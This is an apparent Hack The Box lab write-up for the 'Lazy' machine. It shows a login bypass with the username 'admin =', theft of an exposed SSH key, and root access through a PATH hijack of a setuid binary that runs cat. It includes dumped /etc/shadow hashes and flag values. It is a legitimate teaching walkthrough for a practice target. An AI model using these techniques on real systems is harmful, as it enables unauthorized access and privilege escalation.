# Lazy
#### 10.10.10.18
###### Solved by: Dotaplayer365 and revdev

```{r, engine='bash', count_lines}
nmap -sS -sV 10.10.10.18

Nmap scan report for 10.10.10.18
Host is up (0.16s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.48 seconds

```


Website directs us to devcompany's page
![Alt test](https://github.com/netcatus/HTB-Writeups/blob/master/Lazy/images/Website.PNG "Website")

**To start, you will need to create a user register and then log in to check this company's projects and potential.**

Tried some basic SQL Injections on the login page but nada.

So, lets create a testuser

![Alt test](https://github.com/netcatus/HTB-Writeups/blob/master/Lazy/images/testuserlogin.PNG "testuserlogin")



After creating a user, there is something peculiar

Once the user is registered, it automatically logs us in as that user.

Lets try and create a user with the name admin

![Alt test](https://github.com/netcatus/HTB-Writeups/blob/master/Lazy/images/adminalreadyexists.PNG "adminalreadyexists")

So admin already exists...
Maybe if we can trick the login form into thinking we have created the admin user, it should automatically log us into admin

Lets try and play with the username input field

So the user we create will be
```
admin =
```
![Alt test](https://github.com/netcatus/HTB-Writeups/blob/master/Lazy/images/loginwithadmin.PNG "loginwithadmin")

And we are IN!!
![Alt test](https://github.com/netcatus/HTB-Writeups/blob/master/Lazy/images/adminpage.PNG "adminpage")


There is a ssh key which we can download


![Alt test](https://github.com/netcatus/HTB-Writeups/blob/master/Lazy/images/sshkey.PNG "sshkey")

Something important to note in the key page is the highlighted field. Thats the user the key is for

So we save the key in a file called mistos.key

Change its permissions to 600

```
root@kali:~/Hackthebox/Machines/Lazy# wget http://10.10.10.18/mysshkeywithnamemitsos
--2017-10-15 11:36:53--  http://10.10.10.18/mysshkeywithnamemitsos
Connecting to 10.10.10.18:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1679 (1.6K)
Saving to: ‘mysshkeywithnamemitsos’

mysshkeywithnamemitsos                      100%[===========================================================================================>]   1.64K  --.-KB/s    in 0s      

2017-10-15 11:36:53 (75.3 MB/s) - ‘mysshkeywithnamemitsos’ saved [1679/1679]

root@kali:~/Hackthebox/Machines/Lazy# mv mysshkeywithnamemitsos mitsos.key
root@kali:~/Hackthebox/Machines/Lazy# chmod 600 mitsos.key 
```

And we connect to mitsos

```
root@kali:~/Hackthebox/Machines/Lazy# ssh -i mitsos.key mitsos@10.10.10.18
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-31-generic i686)

 * Documentation:  https://help.ubuntu.com/

  System information as of Sun Oct 15 11:29:36 EEST 2017

  System load:  0.0               Processes:           178
  Usage of /:   7.6% of 18.58GB   Users logged in:     0
  Memory usage: 12%               IP address for eth0: 10.10.10.18
  Swap usage:   0%

  Graph this data and manage this system at:
    https://landscape.canonical.com/

Last login: Sun Oct 15 11:29:36 2017 from 10.10.15.189
mitsos@LazyClown:~$ 
```

**user.txt**
```
mitsos@LazyClown:~$ cat user.txt
d558e7924bdfe31266ec96b007dc63fc
```

**Priv Esc**

```
mitsos@LazyClown:~$ ls -l
total 20
-rwsrwsr-x 1 root   root   7303 May  3 00:02 backup
drwxrwxr-x 4 mitsos mitsos 4096 May  2 18:41 peda
-rw------- 1 root   root     33 Oct 15 04:54 tmp.txt
-rw------- 1 mitsos mitsos   33 May  3 18:52 user.txt
```

There is a executable named backup

When we try and run it, it gives something like this
```
mitsos@LazyClown:~$ ./backup 
root:$6$v1daFgo/$.7m9WXOoE4CKFdWvC.8A9aaQ334avEU8KHTmhjjGXMl0CTvZqRfNM5NO2/.7n2WtC58IUOMvLjHL0j4OsDPuL0:17288:0:99999:7:::
daemon:*:17016:0:99999:7:::
bin:*:17016:0:99999:7:::
sys:*:17016:0:99999:7:::
sync:*:17016:0:99999:7:::
games:*:17016:0:99999:7:::
man:*:17016:0:99999:7:::
lp:*:17016:0:99999:7:::
mail:*:17016:0:99999:7:::
news:*:17016:0:99999:7:::
uucp:*:17016:0:99999:7:::
proxy:*:17016:0:99999:7:::
www-data:*:17016:0:99999:7:::
backup:*:17016:0:99999:7:::
list:*:17016:0:99999:7:::
irc:*:17016:0:99999:7:::
gnats:*:17016:0:99999:7:::
nobody:*:17016:0:99999:7:::
libuuid:!:17016:0:99999:7:::
syslog:*:17016:0:99999:7:::
messagebus:*:17288:0:99999:7:::
landscape:*:17288:0:99999:7:::
mitsos:$6$LMSqqYD8$pqz8f/.wmOw3XwiLdqDuntwSrWy4P1hMYwc2MfZ70yA67pkjTaJgzbYaSgPlfnyCLLDDTDSoHJB99q2ky7lEB1:17288:0:99999:7:::
mysql:!:17288:0:99999:7:::
sshd:*:17288:0:99999:7:::
```

Lets run a strings on it

```
mitsos@LazyClown:~$ strings backup 
/lib/ld-linux.so.2
libc.so.6
_IO_stdin_used
system
__libc_start_main
__gmon_start__
GLIBC_2.0
PTRh
[^_]
cat /etc/shadow
;*2$"
...
...
...
```

So its a simple exec which runs the command "cat /etc/shadow" and it is run by root

This is perfect for priv esc!

Our path contains
```
mitsos@LazyClown:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

What we can do is create a executable with the name cat in our home directory and add the our home directory to our $PATH

Lets start by addint the $PATH first
```
mitsos@LazyClown:~$ export PATH="/home/mitsos:$PATH"
mitsos@LazyClown:~$ echo $PATH
/home/mitsos:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Now we need to create a cat executable.

We can create a bash script which will spawn a bash shell

Something as simple as
```
#!/bin/sh

/bin/sh
```

```
mitsos@LazyClown:~$ vim cat
mitsos@LazyClown:~$ chmod 777 cat
mitsos@LazyClown:~$ ls -l
total 24
-rwsrwsr-x 1 root   root   7303 May  3 00:02 backup
-rwxrwxrwx 1 mitsos mitsos   19 Oct 15 23:00 cat
drwxrwxr-x 4 mitsos mitsos 4096 May  2 18:41 peda
-rw------- 1 root   root     33 Oct 15 04:54 tmp.txt
-rw------- 1 mitsos mitsos   33 May  3 18:52 user.txt
```

We run "backup" now and it should pawn this lazy banana

```
mitsos@LazyClown:~$ ./backup 
# id
uid=1000(mitsos) gid=1000(mitsos) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare),1000(mitsos)
```
Remember, the cat command wont work now. So to use it we have to call it directly from /bin/cat

**root.txt**
```
/binn/cat /root/root.txt
990b142c3cefd46a5e7d61f678d45515
```
